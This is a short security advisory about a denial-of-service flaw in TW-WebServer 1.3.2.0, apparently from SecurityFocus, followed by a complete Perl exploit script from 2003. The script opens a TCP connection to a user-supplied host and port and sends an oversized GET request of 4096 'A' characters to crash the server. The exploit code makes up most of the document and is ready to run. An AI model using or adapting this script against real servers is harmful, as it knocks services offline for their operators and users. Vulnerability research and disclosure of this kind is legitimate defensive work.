source: http://www.securityfocus.com/bid/7368/info

It has been reported that TW-WebServer is prone to a denial of service vulnerability. Reportedly when an excessive quantity of data is sent to the TW-Webserver as part of a malicious HTTP GET request the server will fail.

Although unconfirmed, due to the nature of this vulnerability, an attacker may have the ability to supply and execute arbitrary code. 

#!/usr/bin/perl
#
# Twilight Utilities TW-WebServer/1,3,2,0 
#
# Vulnerable systems:
# TW-WebServer/1, 3, 2, 0
# 
# Written by badpack3t <badpack3t@security-protocols.com>
# For SP Research Labs
# 04/15/2003
# 
# www.security-protocols.com
# 
# usage: 
# perl sp-urfuqed.pl <target> <port>
#
# big ups 2: acidjazz, #havoc, regulate, cr0wn, mp, lopt, 
# aitek5, rab, #darknet, dvdman, bind, and whoever the f else.

use IO::Socket;
use strict;

print ".:."x 20; print "\nTW-WebServer/1, 3, 2, 0 DoS, <badpack3t\@security-protocols.com>\n";
print ".:."x 20; print "\n\n";

if(!defined($ARGV[0] && $ARGV[1]))
{
   &usage;
}

my $host     = $ARGV[0];
my $def      = "A";
my $num	     = "4096";
my $port     = $ARGV[1];
my $urfuqed  = $def x $num;

my $tcpval   = getprotobyname('tcp');
my $serverIP = inet_aton($host);
my $serverAddr = sockaddr_in($ARGV[1], $serverIP);
my $protocol_name = "tcp";

my $iaddr    = inet_aton($host) 	   || die ("host was not found: $host");
my $paddr    = sockaddr_in($port, $iaddr)  || die ("you did something wrong stupid... exiting...");
my $proto    = getprotobyname('tcp')       || die ("cannot get protocol");
socket(SOCK, PF_INET, SOCK_STREAM, $proto) || die ("socket could not open: $host");
connect(SOCK, $paddr) 			   || die ("cannot connect to: $host");

my $submit   = "GET $urfuqed HTTP/1.0\r\n\r\n";   
send(SOCK,$submit,0);
close(SOCK);

sub usage {die("\n\nUsage: perl $0 <target_host> <port>\n\n");}

print "\n.:.:.:.:.:.:.:.:.:.:.:.";
print "\ncrash was successful ~!\n";
print "\.:.:.:.:.:.:.:.:.:.:.:.\n";